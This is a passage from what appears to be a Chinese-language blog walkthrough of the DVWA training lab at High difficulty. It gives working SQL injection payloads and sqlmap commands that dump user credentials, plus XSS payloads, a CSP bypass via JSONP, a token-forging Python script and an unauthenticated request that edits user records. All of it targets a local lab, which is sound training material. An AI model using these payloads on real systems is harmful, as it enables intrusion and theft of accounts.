+<li><strong>验证注入点</strong>：输入<code>1&#39; and 1=1 #</code>，正常返回数据；输入<code>1&#39; and 1=2 #</code>，无数据返回，注入点有效。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172947691.png"></li>
+<li><strong>判断列数</strong>：输入<code>1&#39; order by 2 #</code>，正常返回；输入<code>1&#39; order by 3 #</code>，报错，说明查询结果为<strong>2列</strong>。</li>
+<li><strong>联合注入提取数据</strong>：<ul>
+<li>提取数据库名：<code>-1&#39; union select 1,database() #</code></li>
+<li>提取表名：<code>-1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code></li>
+<li>提取字段名：<code>-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #</code></li>
+<li>提取账号密码：<code>-1&#39; union select user,password from users #</code><br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173049751.png"></li>
+</ul>
+</li>
+</ol>
+<h3 id="利用步骤（Sqlmap自动化注入）"><a href="#利用步骤（Sqlmap自动化注入）" class="headerlink" title="利用步骤（Sqlmap自动化注入）"></a>利用步骤（Sqlmap自动化注入）</h3><p>由于注入结果在<strong>第二个页面</strong>展示，需使用<code>--second-url</code>参数指定结果页面，命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取所有数据库</span></span><br><span class="line">sqlmap -r D:\Backup\桌面\1.txt --dbs --batch --second-url=http://dvwa:8564/vulnerabilities/sqli/</span><br><span class="line"><span class="comment"># 读取users表数据</span></span><br><span class="line">sqlmap -r D:\Backup\桌面\1.txt -D dvwa -T <span class="built_in">users</span> -C user,password --dump --batch --second-url=http://dvwa:8564/vulnerabilities/sqli/</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173204950.png"><br>执行后成功提取数据库中所有账号和加密后的密码。</p>
+<hr>
+<h2 id="8-SQL-Injection-Blind-—-SQL-盲注"><a href="#8-SQL-Injection-Blind-—-SQL-盲注" class="headerlink" title="8. SQL Injection (Blind) — SQL 盲注"></a>8. SQL Injection (Blind) — SQL 盲注</h2><h3 id="漏洞特点-6"><a href="#漏洞特点-6" class="headerlink" title="漏洞特点"></a>漏洞特点</h3><p>High 难度在时间盲注中加入<strong>随机sleep延迟</strong>（<code>rand(0,5)==3</code>时触发2-4秒延迟），导致时间盲注失效，仅能使用<strong>布尔盲注</strong>实现数据提取。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173222105.png"></p>
+<h3 id="漏洞代码分析-3"><a href="#漏洞代码分析-3" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 随机sleep，干扰时间盲注</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">5</span>)==<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="title function_ invoke__">rand</span>(<span class="number">2</span>,<span class="number">4</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用步骤（Sqlmap自动化布尔盲注）"><a href="#利用步骤（Sqlmap自动化布尔盲注）" class="headerlink" title="利用步骤（Sqlmap自动化布尔盲注）"></a>利用步骤（Sqlmap自动化布尔盲注）</h3><ol>
+<li><strong>抓包</strong>：抓取盲注请求包，发现注入点位于<strong>Cookie的id参数</strong>中（<code>id=1</code>）。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173251073.png"></li>
+<li><strong>指定布尔盲注</strong>：使用<code>--technique=B</code>参数强制Sqlmap使用布尔盲注，结合<code>--second-url</code>指定结果页面，命令如下：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r D:\Backup\桌面\1.txt --dbs --batch --second-url=<span class="string">&quot;http://dvwa:8564/vulnerabilities/sqli_blind/&quot;</span> --technique=B</span><br></pre></td></tr></table></figure></li>
+<li><strong>结果提取</strong>：Sqlmap通过布尔盲注的页面回显差异，成功爆破出所有数据库名（dvwa、security、pikachu等）。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173316329.png"></li>
+</ol>
+<h3 id="核心注意点-2"><a href="#核心注意点-2" class="headerlink" title="核心注意点"></a>核心注意点</h3><p>请求包中有多个参数时，<strong>避免同时标记多个注入点</strong>，逐个测试定位真实注入点（本次为Cookie的id参数）。</p>
+<hr>
+<h2 id="9-Weak-Session-IDs-—-弱会话-ID"><a href="#9-Weak-Session-IDs-—-弱会话-ID" class="headerlink" title="9. Weak Session IDs — 弱会话 ID"></a>9. Weak Session IDs — 弱会话 ID</h2><h3 id="漏洞特点-7"><a href="#漏洞特点-7" class="headerlink" title="漏洞特点"></a>漏洞特点</h3><p>High 难度的<code>dvwaSession</code>参数为<strong>MD5加密的简单数字</strong>，可通过MD5解密构造有效会话ID，导致会话劫持。</p>
+<h3 id="利用步骤-2"><a href="#利用步骤-2" class="headerlink" title="利用步骤"></a>利用步骤</h3><ol>
+<li><strong>查看Cookie</strong>：在浏览器开发者工具中查看Cookie，可见<code>dvwaSession=b6d767d2f8ed5d21a44b0e5886680cb9</code>。</li>
+<li><strong>MD5解密</strong>：将<code>dvwaSession</code>的值进行MD5解密，结果为<strong>22</strong>（简单数字）。</li>
+<li><strong>构造会话ID</strong>：通过MD5加密连续数字（21、22、23、24…），生成大量有效<code>dvwaSession</code>值，尝试会话劫持。</li>
+</ol>
+<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>攻击者可通过构造弱会话ID，冒充其他用户登录系统，获取敏感信息。</p>
+<hr>
+<h2 id="10-XSS-DOM-—-DOM-型跨站脚本"><a href="#10-XSS-DOM-—-DOM-型跨站脚本" class="headerlink" title="10. XSS (DOM) — DOM 型跨站脚本"></a>10. XSS (DOM) — DOM 型跨站脚本</h2><h3 id="漏洞特点-8"><a href="#漏洞特点-8" class="headerlink" title="漏洞特点"></a>漏洞特点</h3><p>High 难度对<code>default</code>参数做了<strong>白名单过滤</strong>（仅允许French、English、German、Spanish），非白名单值会被重定向，可通过**#号**绕过服务器过滤（服务器不解析#后参数，前端DOM解析）。</p>
+<h3 id="漏洞代码分析-4"><a href="#漏洞代码分析-4" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h3><p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173417052.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;default&quot;</span>,<span class="variable">$_GET</span>)&amp;&amp;!<span class="title function_ invoke__">is_nulL</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:<span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:<span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:<span class="keyword">case</span><span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h3><p>构造Payload，<strong>白名单值+#号+XSS脚本</strong>，服务器仅解析#前的English，前端DOM解析#后的XSS脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dvwa:8564/vulnerabilities/xss_d/?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>访问后成功弹出弹窗，XSS利用成功。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173443287.png"></p>
+<hr>
+<h2 id="11-XSS-Reflected-—-反射型跨站脚本"><a href="#11-XSS-Reflected-—-反射型跨站脚本" class="headerlink" title="11. XSS (Reflected) — 反射型跨站脚本"></a>11. XSS (Reflected) — 反射型跨站脚本</h2><h3 id="漏洞特点-9"><a href="#漏洞特点-9" class="headerlink" title="漏洞特点"></a>漏洞特点</h3><p>High 难度对<code>&lt;script&gt;</code>标签做了<strong>严格的正则过滤</strong>（匹配任意变种的script关键字，如ScRiPt、s<x>cript等），无法直接使用script标签，可通过<strong>事件型XSS</strong>绕过滤。</p>
+<h3 id="漏洞代码分析-5"><a href="#漏洞代码分析-5" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h3><p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173453557.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&lt;(.*)s(.*)c(.*)(.)i(.*)p(.*)t/i&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$html</span>.=<span class="string">&quot;&lt;pre&gt;hello<span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="利用方法-3"><a href="#利用方法-3" class="headerlink" title="利用方法"></a>利用方法</h3><p>使用<code>&lt;img&gt;</code>标签的<strong>onerror事件</strong>构造无script的XSS Payload，触发弹窗：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<p>提交后成功弹出弹窗，XSS利用成功。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173505508.png"></p>
+<h3 id="拓展Payload"><a href="#拓展Payload" class="headerlink" title="拓展Payload"></a>拓展Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div onmouseover=alert(1)&gt;鼠标悬停触发&lt;/div&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;点击触发&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="12-XSS-Stored-—-存储型跨站脚本"><a href="#12-XSS-Stored-—-存储型跨站脚本" class="headerlink" title="12. XSS (Stored) — 存储型跨站脚本"></a>12. XSS (Stored) — 存储型跨站脚本</h2><h3 id="漏洞特点-10"><a href="#漏洞特点-10" class="headerlink" title="漏洞特点"></a>漏洞特点</h3><p>High 难度对<code>message</code>字段做了<strong>多重过滤</strong>（<code>strip_tags</code>+<code>addslashes</code>+<code>htmlspecialchars</code>），完全无法注入；对<code>name</code>字段仅过滤<code>&lt;script&gt;</code>标签，可在<code>name</code>字段构造<strong>事件型XSS</strong>，并修改前端输入框限制实现长Payload输入。</p>
+<h3 id="漏洞代码分析-6"><a href="#漏洞代码分析-6" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h3><p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173533479.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// message字段严格过滤</span></span><br><span class="line"><span class="variable">$message</span>=<span class="title function_ invoke__">strip_tags</span>(<span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span>));</span><br><span class="line"><span class="variable">$message</span>=<span class="title function_ invoke__">htmlspecialchars</span> ( <span class="variable">$message</span>);</span><br><span class="line"><span class="comment">// name字段仅过滤script标签</span></span><br><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&lt;(.*)s(.*)c(.*)i(.*)p(.*)t/i&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$name</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="利用步骤-3"><a href="#利用步骤-3" class="headerlink" title="利用步骤"></a>利用步骤</h3><ol>
+<li><strong>修改前端输入限制</strong>：<code>name</code>输入框默认有长度限制，通过浏览器开发者工具修改<code>maxlength</code>为<strong>10000</strong>，允许输入长Payload。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173548381.png"></li>
+<li><strong>构造Payload</strong>：在<code>name</code>字段输入<code>&lt;img&gt;</code>标签的onerror事件XSS Payload，<code>message</code>字段任意填写：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173556920.png"></li>
+<li><strong>提交触发</strong>：提交后留言簿中存储该Payload，任意用户访问留言簿页面时，自动弹出弹窗，存储型XSS利用成功。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173602044.png"></li>
+</ol>
+<hr>
+<h2 id="13-CSP-Bypass-—-CSP-绕过"><a href="#13-CSP-Bypass-—-CSP-绕过" class="headerlink" title="13. CSP Bypass — CSP 绕过"></a>13. CSP Bypass — CSP 绕过</h2><h3 id="漏洞特点-11"><a href="#漏洞特点-11" class="headerlink" title="漏洞特点"></a>漏洞特点</h3><p>High 难度配置了<strong>内容安全策略（CSP）</strong>，仅允许加载<code>self</code>（自身域名）的脚本，禁止外部脚本和未授权内联脚本，但靶场<strong>自身代码存在逻辑漏洞</strong>，可通过自身的JSONP接口绕过CSP。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173631677.png"><br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173738131.png"></p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol>
+<li>查看响应头，CSP配置为：<code>Content-Security-Policy: script-src &#39;self&#39;</code>。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173616634.png"></li>
+<li>发现靶场存在<strong>JSONP接口</strong>：<code>/vulnerabilities/csp/source/jsonp.php?callback=xxx</code>，该接口可接收任意callback参数并执行，且属于自身域名，符合CSP规则。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173653009.png"></li>
+<li>后端存在<strong>任意代码写入漏洞</strong>，<code>include</code>参数可直接写入HTML&#x2F;JS代码，无过滤。</li>
+</ol>
+<h3 id="利用方法-4"><a href="#利用方法-4" class="headerlink" title="利用方法"></a>利用方法</h3><p>通过POST请求向<code>include</code>参数注入脚本，加载自身JSONP接口并执行XSS代码，Payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include=&lt;script src=&quot;/vulnerabilities/csp/source/jsonp.php?callback=alert(1)&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><ol>
+<li>打开Burp Suite的Repeater，构造POST请求，目标URL：<code>http://dvwa:8564/vulnerabilities/csp/</code>；</li>
+<li>请求体为<code>application/x-www-form-urlencoded</code>，参数：<code>include=&lt;script src=&quot;/vulnerabilities/csp/source/jsonp.php?callback=alert(1)&quot;&gt;&lt;/script&gt;</code>；</li>
+<li>发送请求后，成功弹出弹窗，CSP绕过成功。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173751208.png"></li>
+</ol>
+<hr>
+<h2 id="14-JavaScript-Attacks-—-JavaScript-攻击"><a href="#14-JavaScript-Attacks-—-JavaScript-攻击" class="headerlink" title="14. JavaScript Attacks — JavaScript 攻击"></a>14. JavaScript Attacks — JavaScript 攻击</h2><h3 id="漏洞特点-12"><a href="#漏洞特点-12" class="headerlink" title="漏洞特点"></a>漏洞特点</h3><p>High 难度通过<strong>JavaScript加密算法</strong>生成<code>token</code>，需提交正确的<code>phrase</code>+<code>token</code>才能通过验证，核心为分析加密逻辑并还原<code>token</code>生成过程。</p>
+<h3 id="加密逻辑分析"><a href="#加密逻辑分析" class="headerlink" title="加密逻辑分析"></a>加密逻辑分析</h3><p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173801899.png"><br>通过Burp抓包获取混淆的JS代码，<strong>反混淆</strong>后得到3个核心加密函数，执行顺序为：<code>token_part_1</code> → <code>token_part_2</code>（300ms延时） → <code>token_part_3</code>（点击提交触发）。</p>
+<h4 id="反混淆后核心JS代码"><a href="#反混淆后核心JS代码" class="headerlink" title="反混淆后核心JS代码"></a>反混淆后核心JS代码</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字符串反转</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">do_something</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.<span class="property">length</span> - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// sha256(YY + token)，High难度为XX</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_2</span>(<span class="params">e = <span class="string">&quot;XX&quot;</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">sha256</span>(e + <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// sha256(token + ZZ)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_3</span>(<span class="params">t, y = <span class="string">&quot;ZZ&quot;</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">sha256</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> + y)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 反转phrase赋值给token</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_1</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">do_something</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行顺序：先token_part_1，300ms后token_part_2，点击提交触发token_part_3</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;<span class="title function_">token_part_2</span>(<span class="string">&quot;XX&quot;</span>)&#125;, <span class="number">300</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;send&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, token_part_3);</span><br><span class="line"><span class="title function_">token_part_1</span>(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173834572.png"></p>
+<h3 id="利用方法（两种）"><a href="#利用方法（两种）" class="headerlink" title="利用方法（两种）"></a>利用方法（两种）</h3><h4 id="方法1：前端控制台手动执行加密函数"><a href="#方法1：前端控制台手动执行加密函数" class="headerlink" title="方法1：前端控制台手动执行加密函数"></a>方法1：前端控制台手动执行加密函数</h4><ol>
+<li>在输入框中填入正确的<code>phrase</code>：<code>success</code>；<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173858457.png"></li>
+<li>打开浏览器开发者工具控制台，按顺序执行加密函数：<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">token_part_1</span>(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br><span class="line"><span class="title function_">token_part_2</span>(<span class="string">&quot;XX&quot;</span>);</span><br></pre></td></tr></table></figure>
+<img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173908224.png"></li>
+<li>点击<strong>提交按钮</strong>，触发<code>token_part_3</code>生成最终token，验证成功。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173918617.png"></li>
+</ol>
+<h4 id="方法2：Python脚本还原加密过程，直接生成token"><a href="#方法2：Python脚本还原加密过程，直接生成token" class="headerlink" title="方法2：Python脚本还原加密过程，直接生成token"></a>方法2：Python脚本还原加密过程，直接生成token</h4><p>通过Python实现字符串反转+SHA256加密，直接生成最终token，构造POST请求提交。</p>
+<h5 id="Python加密脚本"><a href="#Python加密脚本" class="headerlink" title="Python加密脚本"></a>Python加密脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_something</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;字符串反转&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> e[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;SHA256 哈希计算&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(s.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_token</span>(<span class="params">phrase=<span class="string">&quot;success&quot;</span></span>):</span><br><span class="line">    <span class="comment"># Step 1: token_part_1 - 反转phrase</span></span><br><span class="line">    token = do_something(phrase)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Step 1 (反转phrase): <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># Step 2: token_part_2 - sha256(&quot;XX&quot; + token)</span></span><br><span class="line">    token = sha256(<span class="string">&quot;XX&quot;</span> + token)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Step 2 (sha256 XX+token): <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># Step 3: token_part_3 - sha256(token + &quot;ZZ&quot;)</span></span><br><span class="line">    token = sha256(token + <span class="string">&quot;ZZ&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Step 3 (sha256 token+ZZ): <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    phrase = <span class="string">&quot;success&quot;</span></span><br><span class="line">    token = calc_token(phrase)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n最终token: <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;POST数据: phrase=<span class="subst">&#123;phrase&#125;</span>&amp;send=Submit&amp;token=<span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h5 id="执行脚本"><a href="#执行脚本" class="headerlink" title="执行脚本"></a>执行脚本</h5><p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173945078.png"><br>运行后生成最终token，通过Burp构造POST请求提交，验证成功。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173956836.png"><br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174004314.png"></p>
+<hr>
+<h2 id="15-Authorisation-Bypass-—-越权访问"><a href="#15-Authorisation-Bypass-—-越权访问" class="headerlink" title="15. Authorisation Bypass — 越权访问"></a>15. Authorisation Bypass — 越权访问</h2><h3 id="漏洞特点-13"><a href="#漏洞特点-13" class="headerlink" title="漏洞特点"></a>漏洞特点</h3><p>High 难度对前端页面做了<strong>管理员权限校验</strong>（非admin用户访问提示403），但对<strong>后端接口文件<code>change_user_details.php</code>未做鉴权</strong>，可直接发送JSON请求修改任意用户信息。</p>
+<h3 id="漏洞代码分析-7"><a href="#漏洞代码分析-7" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h3><p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174017788.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 前端页面权限校验</span></span><br><span class="line">![](https:<span class="comment">//cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174017788.png)</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">dvwaCurrentUser</span>() !=<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Unauthorised&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 后端接口change_user_details.php 无任何鉴权逻辑</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="利用方法-5"><a href="#利用方法-5" class="headerlink" title="利用方法"></a>利用方法</h3><p>直接向<code>change_user_details.php</code>发送<strong>JSON格式的POST请求</strong>，修改任意用户的id、姓名等信息：</p>
+<ol>
+<li>目标URL：<code>http://dvwa:8564/vulnerabilities/authbypass/change_user_details.php</code>；</li>
+<li>请求头：<code>Content-Type: application/json</code>；</li>
+<li>请求体（JSON）：<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span><span class="attr">&quot;first_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;hacked&quot;</span><span class="punctuation">,</span><span class="attr">&quot;surname&quot;</span><span class="punctuation">:</span><span class="string">&quot;hacked&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174058618.png"></li>
